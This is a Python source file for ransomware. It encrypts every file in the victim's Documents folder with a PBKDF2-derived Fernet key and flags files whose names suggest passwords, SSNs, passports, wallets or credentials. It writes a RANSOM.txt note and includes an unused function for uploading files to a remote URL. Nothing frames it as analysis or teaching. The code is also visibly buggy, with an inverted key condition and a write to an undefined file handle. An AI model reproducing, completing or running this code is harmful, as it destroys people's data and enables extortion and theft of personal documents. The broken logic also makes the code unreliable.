import os
import sys
import platform 
import subprocess
import asyncio
from cryptography import fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
from random import choice
import string
import base64
import requests
from setuptools import find_namespace_packages

# Sensitive keywords
sensitive = ['password', 'credit', 'social', 'security', 'number', 'tax', '.pem', 'mortgage', 'address', 'crypto', 'bitcoin', 'wallet', 'budget', 'pwd', 'user', 'usr', 'wifi', 'credentials', 'creds', 'sensitive', 'important', 'info', 'private', 'personal', 'identity', 'license', 'court', 'ssn', 'signature', 'dl', 'passport', 'transcripts', 'email']
sensitive_files = []

# Encryption key generation
def generate_key(key=None):
    if key != None:
        global enc_key
        enc_key = ''.join(choice(string.ascii_letters + string.digits) for i in range(128))
    else: 
        enc_key = key
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA512(),
        length=32,
        salt=b'', # bytes(choice(string.ascii_letters + string.digits) for i in range(128)),
        iterations= 12000, #choice(range(1, 100000)),
        backend=default_backend()
    )
    enc_key = base64.urlsafe_b64encode(kdf.derive(enc_key.encode()))
    fn = fernet.Fernet(enc_key)
    return fn



async def encrypt_file(path):
    try:
        with open(path, 'rb') as f:
            data = f.read()
        encrypted = fn.encrypt(data)
        with open(path, 'wb') as f:
            f.write(encrypted)
    except Exception:
        return False
    return True

async def decrypt_file(path):
    try:
        with open(path, 'rb') as f:
            data = f.read()
        decrypted = fn.decrypt(data)
        with open(path, 'wb') as f:
            f.write(decrypted)
    except Exception:
        return False
    return True

async def upload_file(file, url):
    try:
        r = requests.post(url, files={'file': open(file, 'rb')})
    except Exception:
        pass


async def main():
    tasks = []

    # Determine OS and set vars appropriately
    if platform.system() == 'Windows':
        home_dir = os.environ['HOMEPATH']
        docs_dir = os.environ['HOMEDRIVE'] + home_dir + '\\Documents'
        desktop_dir = os.environ['HOMEDRIVE'] + home_dir + '\\Desktop'
    if platform.system() == 'Linux' or platform.system() == 'Linux2':
        home_dir = os.environ['HOME']
        docs_dir = home_dir + '/Documents'
        desktop_dir = home_dir + '/Desktop'
    if platform.system() == 'Darwin':
        home_dir = os.environ['HOME']
        docs_dir = home_dir + '/Documents'
        desktop_dir = home_dir + '/Desktop'

    if sys.argv[1]:
        action = "decrypt"
    else:
        action = "encrypt"
    global fn
    fn = generate_key(sys.argv[1])

    for task in tasks:
        await task
    for root, dirs, files in os.walk(docs_dir):
        for file in files:
            if action == "encrypt":
                tasks.append(encrypt_file(os.path.join(root, file)))
            if action == "decrypt":
                tasks.append(decrypt_file(os.path.join(root, file)))
            for keyword in sensitive:
                if keyword in str(file).lower():
                    sensitive_files.append(os.path.join(root, file))
            

    
    await asyncio.gather(*tasks)
    with open(desktop_dir + 'RANSOM.txt', "wb"):
        file.write("your encryption key is: " + enc_key)
        file.write("found the following potentially sensitive files: " + str(sensitive_files))


if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    try:
        loop.run_until_complete(main())
    finally:
        loop.run_until_complete(loop.shutdown_asyncgens())
        loop.close()




